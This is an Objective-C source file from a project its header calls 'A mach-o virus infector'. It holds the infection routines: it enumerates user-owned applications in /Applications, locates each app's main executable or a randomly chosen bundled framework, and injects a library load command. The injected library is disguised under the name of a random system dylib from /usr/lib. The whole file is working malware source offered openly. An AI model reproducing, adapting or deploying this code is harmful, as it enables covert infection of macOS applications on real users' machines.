/*     _____                                                                  
 *  __|_    |__  ____   _  ______  ______  ______   __    _____  _____   ___  
 * |    |      ||    \ | ||   ___||   ___||   ___|_|  |_ /     \|     | |   | 
 * |    |      ||     \| ||   ___||   ___||   |__|_    _||     ||     \ |___| 
 * |____|    __||__/\____||___|   |______||______| |__|  \_____/|__|\__\|___| 
 *    |_____|                                                                 
 *
 * A mach-o virus infector
 *
 * Copyright (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * infection_operations.m
 *
 */

#include "infection_operations.h"
#include "configuration.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <strings.h>
#include <sys/types.h>
#include <pwd.h>
#include "injectors.h"
#include "encrypt.h"
#include "fileoperations.h"
#include "header.h"

#pragma mark Infection routines

/*
 * try to infect the main binary for each app
 */
uint8_t
try_to_infect_mainbinary(NSString *targetAppFolder)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    int retvalue = 0;
    @autoreleasepool
    {
        target_info_t targetInfo = { 0 };
        
        // test if target path ends with slash, add if not
        NSMutableString *tempTargetAppFolder = [NSMutableString stringWithString:targetAppFolder];
        if ([tempTargetAppFolder characterAtIndex:[tempTargetAppFolder length]-1] != '/')
            [tempTargetAppFolder appendString:@"/"];
        
        // sets the full path to the binary to be infected
        if (find_main_executable((char*)[tempTargetAppFolder UTF8String], &targetInfo)) return 1;
        if (init_target(&targetInfo)) return 1;
        
        char *virusLibName = get_random_libname();
        char searchPath[] = "@executable_path/";
        NSString *tempLibName = [NSString stringWithFormat:@"%s%s", searchPath, virusLibName];
        
        // if it's possible to inject, fill up the global structure with injection info
        if (can_inject_library(targetInfo.targetBinaryPath, [tempLibName UTF8String], &targetInfo) == 0)
        {
            size_t tmp_len = 0;
            tmp_len = strlen([tempLibName UTF8String]) + 1;
            targetInfo.injectionHeaderPath = malloc(tmp_len);
            strlcpy(targetInfo.injectionHeaderPath, [tempLibName UTF8String], tmp_len);

            // FIXME: verify if this random lib name will fit in the available space ?
            NSMutableString *tempTargetPath = [NSMutableString stringWithString:tempTargetAppFolder];
            [tempTargetPath appendFormat:@"Contents/MacOS/%@", [NSString stringWithCString:virusLibName encoding:NSUTF8StringEncoding]];
            tmp_len = [tempTargetPath length] + 1;
            targetInfo.injectionTargetPath = malloc(tmp_len);
            strlcpy(targetInfo.injectionTargetPath, [tempTargetPath UTF8String], tmp_len);
            
            tmp_len = strlen(virusLibName) + 1;
            targetInfo.injectionLibraryName = malloc(tmp_len);
            strlcpy(targetInfo.injectionLibraryName, virusLibName, tmp_len);
            
            if (inject_library(&targetInfo))
            {
                retvalue = 1;
            }
            free(targetInfo.injectionHeaderPath);
            free(targetInfo.injectionTargetPath);
            free(targetInfo.targetBinaryPath);
        }
        
        // cleanup
        free(targetInfo.buffer);
        free(virusLibName);
    }
    return retvalue;
}

/*
 * the entry point function that will try to inject a framework
 */
uint8_t
try_to_infect_frameworks(NSString *targetAppFolder)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif

    target_info_t targetInfo = { 0 };
    // search for a framework we can infect
    // the structure contains all the target info as well a ptr to a buffer with its contents
    int retvalue = find_infectable_framework(targetAppFolder, &targetInfo);
    
    // if one is found, proceed to infect library
    if (retvalue == 0)
    {
#if DEBUG
        printf("[DEBUG] Lib to infect:\n %s\n at %s\n %s\n", targetInfo.targetBinaryPath,
               targetInfo.injectionHeaderPath,
               targetInfo.injectionTargetPath);
#endif
        // try to execute the injection
        if (inject_library(&targetInfo))
        {
#if DEBUG
            fprintf(stderr, "[ERROR] Injection failed!\n");
#endif
            retvalue = 1;
        }
        else
        {
            retvalue = 0; // successful injection
        }
        // cleanup
        free(targetInfo.injectionHeaderPath);
        free(targetInfo.injectionTargetPath);
        free(targetInfo.targetBinaryPath);
        free(targetInfo.buffer);
        return retvalue;
    }
    return retvalue;
}

#pragma mark Functions to find information we need for infection operations

/*
 * find apps in /Applications that are owned by the user executing the infector
 * parameter is a MutableArray to hold the list of infectable apps
 */
int
find_infectable_apps(NSMutableArray *targets)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    @autoreleasepool
    {
        // XXX: hide string
        NSString *folderToSearch = INFECTION_PATH;
        NSFileManager *fm = [NSFileManager new];
        // XXX: not recursive enough ?
        NSArray *folderList = [fm contentsOfDirectoryAtPath:folderToSearch error:NULL];
        // get information from the user executing this process
        struct passwd *pwdinfo = getpwuid(getuid());
        // iterate thru all apps found in the target folder
        for (id object in folderList)
        {
            // full path is for example /Applications/appname.app
            NSString *targetFullPath = [folderToSearch stringByAppendingPathComponent:(NSString*)object];
            // get attributes of that folder
            NSDictionary *attribs = [fm attributesOfItemAtPath:targetFullPath error:NULL];
            // verify if it's owned by the user executing this process
            if ([[attribs fileOwnerAccountName] isEqual:[NSString stringWithUTF8String:pwdinfo->pw_name]])
            {
                [targets addObject:targetFullPath];
            }
        }
        return 0;
    }
}


/*
 * function that will return the full path to the main executable of an .app folder
 */
uint8_t
find_main_executable(char *targetPath, target_info_t *targetInfo)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    @autoreleasepool
    {
        NSMutableString *fullTargetPath = [NSMutableString stringWithCString:targetPath encoding:NSUTF8StringEncoding];
        NSBundle *bundle = [NSBundle bundleWithPath:fullTargetPath];
        NSDictionary *plistData = [bundle infoDictionary];
        
        NSString *targetExe = (NSString*)[plistData objectForKey:@"CFBundleExecutable"];
        
        if (targetExe != nil)
        {
#if DEBUG
            printf("[DEBUG] Main executable is %s at %s\n", [targetExe UTF8String], [fullTargetPath UTF8String]);
#endif
            [fullTargetPath appendFormat:@"Contents/MacOS/%@", targetExe];
            size_t pathLen = [fullTargetPath length] + 1;
            targetInfo->targetBinaryPath = malloc(pathLen);
            strlcpy(targetInfo->targetBinaryPath, [fullTargetPath UTF8String], pathLen);
//            [fullTargetPath getCString:targetInfo->targetBinaryPath
//                             maxLength:[fullTargetPath length]+1
//                              encoding:NSUTF8StringEncoding];
            NSFileManager *fm = [NSFileManager new];
            if (![fm fileExistsAtPath:fullTargetPath])
            {
#if DEBUG
                fprintf(stderr, "[ERROR] Can't find the target exe at %s\n", targetInfo->targetBinaryPath);
#endif
                return 1;
            }
        }
        else
        {
#if DEBUG
            fprintf(stderr, "[ERROR] Can't find the target exe at %s\n", [fullTargetPath UTF8String]);
#endif
            return 1;
        }
    }
    return 0;
}


/*
 * find and try to infect a framework used by the target application
 * argument is the full path to the application. Example /Applications/appname.app
 * returns string with full path to the library binary to be infected, NULL in case of failure
 */
uint8_t
find_infectable_framework(NSString *targetAppFolder, target_info_t *targetInfo)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    uint8_t retvalue = 1;
    @autoreleasepool 
    {
        NSFileManager *fm = [NSFileManager new];
        NSString *frameworksPath = [targetAppFolder stringByAppendingPathComponent:@"Contents/Frameworks"];
        // get the content of frameworks folder
        NSMutableArray *frameworksList = (NSMutableArray*)[fm contentsOfDirectoryAtPath:frameworksPath error:NULL];
        // if count is zero, then exit the function
        uint32_t dirlistCount = (uint32_t)[frameworksList count];
        if (dirlistCount == 0)
        {
#if DEBUG
            printf("[DEBUG] No frameworks to infect found!\n");
#endif
            return retvalue;
        }
        // get a random library name to be used for injection
        char *virusLibName = get_random_libname();
        // to test if infection is possible we need path to the framework executable
        // the complete library name
        NSMutableString *fullLibName = [NSMutableString new];
        [fullLibName appendString:@"@executable_path/../Frameworks/"];
        uint32_t index = 0;
        // select random framework and verify if it has available injection space
        while (1 && dirlistCount > 0)
        {
            // get a random index into the frameworks list array
            index = arc4random() % dirlistCount;
            // the path to random selected framework
            NSString *currentFrameworkPath = [frameworksPath stringByAppendingPathComponent:(NSString*)[frameworksList objectAtIndex:index]];
            NSBundle *bundle = [NSBundle bundleWithPath:currentFrameworkPath];
            NSDictionary *plistData = [bundle infoDictionary];
            // retrieve the executable name
            // NOTE: not all frameworks have this configured, or correctly so
            // some use the extension .frameworks, others some variable
            // we will skip those cases
            NSString *targetBinary = (NSString*)[plistData objectForKey:@"CFBundleExecutable"];
            
            if (targetBinary != nil)
            {   
                NSString *tempLibName = [NSString stringWithFormat:@"%@%@/Versions/Current/%s", fullLibName, (NSString*)[frameworksList objectAtIndex:index], virusLibName];
                NSString *tempLibPath = [NSString stringWithFormat:@"%@/Versions/Current/%s", currentFrameworkPath, virusLibName];
                NSString *tempBinaryPath = [NSString stringWithFormat:@"%@/Versions/Current/%@", currentFrameworkPath, targetBinary];
                // verify if file exists and if it has enough injection space
                if ([fm fileExistsAtPath:tempBinaryPath])
                {
                    // if it's possible to inject, fill up the global structure with injection info
                    if (can_inject_library([tempBinaryPath UTF8String], [tempLibName UTF8String], targetInfo) == 0)
                    {
                        size_t tmp_len = 0;
                        tmp_len = strlen([tempLibName UTF8String]) + 1;
                        targetInfo->injectionHeaderPath = malloc(tmp_len);
                        strlcpy(targetInfo->injectionHeaderPath, [tempLibName UTF8String], tmp_len);
                        
                        tmp_len = strlen([tempLibPath UTF8String]) + 1;
                        targetInfo->injectionTargetPath = malloc(tmp_len);
                        strlcpy(targetInfo->injectionTargetPath, [tempLibPath UTF8String], tmp_len);
                        
                        tmp_len = strlen([tempBinaryPath UTF8String]) + 1;
                        targetInfo->targetBinaryPath = malloc(tmp_len);
                        strlcpy(targetInfo->targetBinaryPath, [tempBinaryPath UTF8String], tmp_len);
                        
                        tmp_len = strlen(virusLibName) + 1;
                        targetInfo->injectionLibraryName = malloc(tmp_len);
                        strlcpy(targetInfo->injectionLibraryName, virusLibName, tmp_len);
                        
                        retvalue = 0;
                        break;
                    }
                }
            }
            // remove the failed entry from the list so we don't repeat it
            [frameworksList removeObjectAtIndex:index];
            dirlistCount = (uint32_t)[frameworksList count];
        }
        free(virusLibName);
    }
    return retvalue;
}

/*
 * retrieve a random library name from /usr/lib
 * caller is responsible for freeing allocated memory
 */
char *
get_random_libname(void)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    char *libName = NULL;
    @autoreleasepool 
    {
        NSString *path = @"/usr/lib";
        NSFileManager *fm = [NSFileManager new];
        NSArray *dirlist = [fm contentsOfDirectoryAtPath:path error:NULL];
        // we grab a randomized library from /usr/lib
        uint32_t dirlistCount = (uint32_t)[dirlist count];
        uint32_t index = arc4random() % dirlistCount;
        while (1)
        {
            if ([[[dirlist objectAtIndex:index] pathExtension] isEqual:@"dylib"])
            {
                // the returned point will be freed so we need to copy it
                const char *temp = [(NSString*)[dirlist objectAtIndex:index] UTF8String];
                libName = calloc(strlen(temp)+1, sizeof(char));
                strncpy(libName, temp, strlen(temp));
                break;
            }
            index = arc4random() % dirlistCount;
        }
    }    
    return libName;
}
